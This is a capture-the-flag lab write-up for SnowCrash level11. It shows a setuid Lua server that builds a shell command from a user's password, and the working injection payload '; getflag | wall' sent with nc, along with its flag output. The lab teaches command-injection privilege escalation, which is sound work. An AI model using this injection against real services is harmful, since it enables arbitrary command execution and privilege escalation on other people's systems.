# Subprocess on user-provided input in script run by privileged use
# Privilege escalation via code injection


```
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
```

```
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end

```

Listens for incoming TCP connections on 127.0.0.1:5151.

This Lua script runs a server on port 5151 that prompts for a password,
hashes it, 
checks if the hash matches a pre-set value. 
If it matches, it congratulates the user; if not, it denies access.

### Vulnerability
There is a line that is easily exploitable

```
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

it is easily exploitable because it constructs a shell command by directly embedding untrusted user input (pass) without any form of validation or sanitization. Here's why it's a security risk:

That is what we will do:

```
level11@SnowCrash:~$ echo '; getflag | wall' | nc localhost 5151
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 23:27 ...                                               
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s  
```

- This command exploits injection vulnerability
The use of the semicolon ; in the injected command '; getflag | wall' terminates the echo command that is part of the script's command string.

- After the echo command is terminated, the getflag command is executed.

- The pipe | operator takes the output of the getflag command and redirects it to the wall command, which broadcasts the message to all users on the system.

When the server script concatenates the user input (in this case, the payload '; getflag | wall') into the shell command and executes it with io.popen, it unintentionally allows the execution of arbitrary commands. If the server does not adequately sanitize the user input, it will run the getflag command and display its output to all users